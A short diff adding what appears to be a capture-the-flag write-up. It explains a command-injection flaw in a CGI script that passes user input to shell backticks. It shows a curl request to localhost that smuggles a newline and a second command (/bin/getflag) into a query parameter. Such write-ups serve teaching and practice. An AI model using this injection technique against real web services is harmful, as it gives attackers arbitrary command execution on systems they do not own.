@@ -1,0 +1,4 @@
+because user input is interpreted directly in shell command in:
+	print `echo $y 2>&1`;
+by adding a newline, we can add any command we want and it will be executed with the right of the cgi script creator:
+	curl 'http://127.0.0.1:4747?x=42%0a/bin/getflag'
